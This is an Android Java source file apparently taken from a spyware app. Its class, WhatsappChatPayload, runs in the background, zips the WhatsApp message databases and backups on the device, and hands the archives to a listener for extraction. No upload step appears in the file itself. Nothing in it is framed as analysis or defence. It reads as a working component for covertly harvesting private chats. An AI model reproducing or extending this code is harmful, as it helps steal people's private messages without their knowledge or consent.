package com.aigs.serviceone.payload;

import android.app.Activity;
import android.content.Context;
import android.os.AsyncTask;

import com.aigs.serviceone.helpers.WatsappTextExtractionListner;
import com.aigs.serviceone.helpers.ZipListener;
import com.aigs.serviceone.helpers.ZipUtils;

import java.io.File;
import java.lang.ref.WeakReference;

public class WhatsappChatPayload extends AsyncTask<String, Integer, String> {

    WeakReference<Context> contextWeakReference;
    WatsappTextExtractionListner watsappTextExtractionListner;
    int count = 0;

    public WhatsappChatPayload(Context context) {
        this.contextWeakReference = new WeakReference<>(context);
    }

    public WhatsappChatPayload setWatsappTextExtractionListner(WatsappTextExtractionListner watsappTextExtractionListner) {
        this.watsappTextExtractionListner = watsappTextExtractionListner;
        return this;
    }

    @Override
    protected String doInBackground(String... strings) {
        final Context activity = contextWeakReference.get();

        File file = new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases/");
        File settings = new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Backups/");

        ZipUtils.getInstance().setZipListener(new ZipListener() {
            @Override
            public void onZipDone() {
                updateProgress();
            }
        }).zipDirectory(file,"/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases.zip");


        ZipUtils.getInstance().setZipListener(new ZipListener() {
            @Override
            public void onZipDone() {
                updateProgress();
            }
        }).zipDirectory(settings,"/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Backups.zip");



        return null;
    }

    private void updateProgress() {
        count++;
        if (count == 2){
            watsappTextExtractionListner.onDataExtracted(new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases.zip"),
                    new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Backups.zip"));
        }

    }
}
